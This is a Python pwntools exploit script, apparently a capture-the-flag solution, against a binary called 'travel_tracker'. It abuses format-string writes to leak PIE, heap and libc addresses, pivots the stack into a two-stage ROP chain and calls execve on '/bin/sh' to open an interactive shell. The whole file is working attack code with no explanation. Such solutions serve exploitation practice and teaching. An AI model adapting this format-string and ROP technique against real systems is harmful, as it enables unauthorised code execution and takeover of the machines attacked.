#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

# HOST = "io.ept.gg"
# PORT =  51041
HOST = "localhost"
PORT =  1024
PROCESS = "./travel_tracker"

def add(code, rating, comment):
    r.sendline("1")  
    if len(code) >= 10:
        r.sendafter(": ", code)
    else:
        r.sendlineafter(": ", code)
    r.sendlineafter(": ", str(rating))
    r.sendlineafter(": ", comment)
    r.recvuntil("choice: ")

def view():
    r.sendline("2")
    LEAK = r.recvuntil("\nTravel", drop=True)
    r.recvuntil("choice: ")
    return LEAK

def edit(idx, code, rating, comment):
    r.sendline("4")  
    r.sendlineafter(": ", str(idx))
    if len(code) >= 10:
        r.sendafter(": ", code)
    else:
        r.sendlineafter(": ", code)
    r.sendlineafter(": ", str(rating))
    r.sendlineafter(": ", comment)
    r.recvuntil("choice: ")

def writetofile():
    r.sendline("3")
    r.recvuntil("choice: ")


def leak(offset):
    payload = "%*{0}$u%6$n".format(offset)
    edit(1, payload, 9, "A"*8)
    writetofile()
    LEAK = u32(view().split("Comment: ")[1][:4].ljust(4, "\x00"))
    return LEAK

def exploit(r):
    r.recvuntil("choice: ")

    # create initial review
    add("AAAA", 9, "AAAA")

    # leak ELF / heap and libc address
    PIELEAK = leak(3)
    HEAPLEAK = leak(6)
    LIBCLEAK = 0x100000000 - leak(13)
    
    e.address = PIELEAK - 0x21d1
    libc.address = LIBCLEAK - 0x22a620

    log.info("PIE leak     : %s" % hex(PIELEAK))
    log.info("ELF          : %s" % hex(e.address))
    log.info("HEAP leak    : %s" % hex(HEAPLEAK))
    log.info("LIBC  leak   : %s" % hex(LIBCLEAK))
    log.info("LIBC         : %s" % hex(libc.address))
        
    # create a heap chunk filled with address to rop chain
    payload = p32(HEAPLEAK+0x180+4)*(0x100)
    add("A", 9, payload)
    edit(2, "A", 9, "A")

    POP1 = e.address + 0x15e6    
    POPESP = libc.address + 0x000262de

    log.info("Send stage 1 ropchain")

    rop = ""    
    rop += p32(libc.symbols["gets"])    
    rop += p32(POP1)
    rop += p32(e.address + 0x4550)
    rop += p32(POPESP)
    rop += p32(e.address + 0x4550)
    
    # write chunk address into stack pointer
    payload = "%*6$u%9$n"

    edit(1, payload, 9, rop)
    writetofile()

    r.sendline("5")

    log.info("Send stage 2 ropchain")

    POPECXEAX = libc.address + 0x128124
    POPEBX = e.address + 0x1022    
    POPEDX = libc.address + 0x37375
    SYSCALL = libc.address + 0x37765

    rop = ""
    rop += p32(0)
    rop += p32(0)
    rop += p32(0)
    rop += p32(0)
    rop += p32(POPECXEAX)
    rop += p32(0)
    rop += p32(11)
    rop += p32(POPEBX)
    rop += p32(next(libc.search("/bin/sh")))
    rop += p32(POPEDX)
    rop += p32(0)
    rop += p32(SYSCALL)

    r.sendline(rop)

    r.interactive()

    return

if __name__ == "__main__":
    e = ELF("./travel_tracker")
    libc = ELF("./libc.so.6")

    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
    else:
        LOCAL = True
        r = process("./travel_tracker", env={"LD_PRELOAD":"./libc.so.6"})
        print(util.proc.pidof(r))
        pause()

    exploit(r)
